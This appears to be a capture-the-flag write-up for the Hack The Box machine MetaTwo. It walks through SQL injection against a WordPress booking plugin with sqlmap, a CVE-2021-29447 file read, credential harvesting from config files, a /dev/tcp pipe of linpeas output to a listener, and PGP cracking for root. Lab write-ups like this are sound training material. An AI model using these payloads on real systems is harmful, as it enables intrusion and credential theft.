---
title: MetaTwo
date: 2022-11-09T17:33:38-08:00
author: Nate Fortner
draft: false
katex: true
type: default
keywords:
  - MetaTwo
  - HackTheBox
lastmod: 2023-05-01T22:56:11.351Z
---

# MetaTwo
## Intial Recon
### Nmap
As usual, I began by running [NmapAutomator](https://github.com/21y4d/nmapAutomator) to get a quick overview of the machine.  I immediately saw that ports `21`, `22`, and `80` were open.  It was running nginx 1.18, ProFTPD, and OpenSSH 8.4.  It was also running on Debian.  On port 80, there is a redirect to `http://metapress.htb`.  Normally I would have to add the IP address and hostname to my hosts file, but I use a script (which can be found [here](https://github.com/bsasealteam6/HTBSupport)) that automatically adds all current HTB machines and IP Addresses to my hosts file, so I just have to find the entry for metatwo.htb and add metapress.htb to the end of the line.
NmapAutomator also ran ffuf against the web server, and found nothing interesting.
### Visiting the site
Next, I browse to `http://metapress.htb` and checkout the site.  It has a link to `http://metapress.htb/events`, which appears to be a meeting scheduler of some sort.  I opened the FireFox developer console network page and submitted the form, then right clicked on the `POST` request and selecting "Copy as cURL."  I then pasted this command into the terminal, replaced the word `curl` with `sqlmap`, and let sqlmap crack on it.  Unfortunately, it didn't find anything interesting.  I did, however, notice that it is a wordpress site.  I ran the command `wpscan --url metapress.htb -e at,ap --plugins-detection mixed` against the site, and found something!  It found a vulnerability (https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357) where I could run SQL queries against the server through a specially crafted cURL.  

## Foothold
### WordPress SQL Injection
One of their examples used the command `curl -i 'https://example.com/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=8cc8b79544&category_id=1&total_service=1) AND (SELECT 9578 FROM (SELECT(SLEEP(5)))iyUp)-- ZmjH' `  I modified this command slightly, getting a nonce value from the HTML code of the booking site, updating the url to be correct, and dumping the injection, then fed this into sqlmap as `sqlmap 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=61a943f4b5&category_id=33&total_service=1' --dbs`.  This told me there was two databases, `information_schema` and `blog`.  With this knowledge, I next ran the command `sqlmap 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=61a943f4b5&category_id=33&total_service=1' -D blog --dump`.  It dumped the full blog database, finding a table `users` with password hashes. It prompted me whether I wanted to try to crack them, so I told it yes, and specified a custom dictionary of `/usr/share/wordlists/rockyou.txt`.  It was unable to give me a password for `admin`, but `manager` had a password of  `partylikearockstar`.  
### WordPress Media Upload
I then used this to sign into wordpress.  And, I have almost no access.  I tried uploading PHP shells to it, and it blocked them.  I also tried signing into ssh with these creds and that was also blocked.  I found directions [here](https://gobiasinfosec.blog/2019/12/24/file-upload-attacks-php-reverse-shell/) for how to upload it anyways, and followed those directions using burpsuite.  Unfortunately, this did not work.  Next, I found [this](https://github.com/motikan2010/CVE-2021-29447) github page, and followed the directions and they worked.  Using this, I was first able to transfer `/etc/nginx/sites-enabled/default` to find out where the wordpress site was stored, then `/var/www/metapress.htb/blog/wp-config.php`, where I found the FTP Username and Password, `metapress.htb:9NYS_ii@FyL_p5M2NvJ`
### FTP
I did a bit of browsing on the FTP server, and eventually found a file called `send_email.php`.  I opened it up and found the following lines: 
```php
$mail->Host = "mail.metapress.htb";
$mail->SMTPAuth = true;                          
$mail->Username = "jnelson@metapress.htb";                 
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";                           
$mail->SMTPSecure = "tls";                           
$mail->Port = 587;       
```
From this, I figured the user account for logging in was `jnelson`, and the password was `Cb4_JmWM8zUZWMu@Ys`.  I then signed in with SSH.
## Root
### Basics
First thing I did was run sudo -l since I have the password for jnelson.  Unfortunately, jnelson was not allowed to use the sudo command at all.  I also did a check of the `/opt` folder, which was empty, as well as `/`, which didn't have anything that caught my eye.  Next up, I ran linpeas, downloading it to the machine with `wget`, and using bash to pipe it back to my host machine. I ran  
`./linpeas.sh >& /dev/tcp/10.10.14.101/4444 0>&1` on the box, and `nc -lvnp 4444 | tee linpeas.out` on my machine.  Looking through the linpeas output file (after converting it to html for easier viewing), I didn't see much.  However, I noticed an interesting folder called `.passpie` in the home folder.  After searching for passpie, I found out it was a password manager and there was a file called `ssh/root.pass` in there, but it's pgp encrypted.  Let's decrypt it!
I was able to find the PGP private key at `~/.passpie/.key`, then I just ran it through `pgp2john` then `john`, and got the password of `blink182`.  Ran `passpie copy ssh --to stdout`, entered `blink182`, and got the root password.  Then I just had to run `su -` and enter the password, and I was root! 